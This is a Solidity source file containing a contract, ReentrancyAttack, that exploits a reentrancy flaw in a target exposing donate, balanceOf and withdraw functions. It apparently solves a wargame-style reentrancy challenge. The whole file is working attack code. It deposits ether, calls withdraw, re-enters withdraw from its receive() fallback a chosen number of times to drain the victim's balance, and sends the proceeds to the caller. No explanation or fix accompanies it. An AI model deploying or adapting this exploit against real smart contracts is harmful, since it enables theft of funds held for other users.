// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface Reentrance {
    function balances(address) external returns (uint256);

    function donate(address) external payable;

    function balanceOf(address) external returns (uint256);

    function withdraw(uint256) external;
}

contract ReentrancyAttack {
    uint256 loop;
    Reentrance victim;

    constructor(address _victim) {
        victim = Reentrance(_victim);
    }

    function attack(uint256 _loop) external payable {
        loop = _loop;
        victim.donate{value: msg.value}(address(this));

        victim.donate{value: address(this).balance}(address(this));

        victim.withdraw(victim.balanceOf(address(this)));

        msg.sender.call{value: address(this).balance}("");
    }

    receive() external payable {
        if (loop > 0) {
            loop -= 1;
            victim.withdraw(victim.balanceOf(address(this)));
        }
    }
}
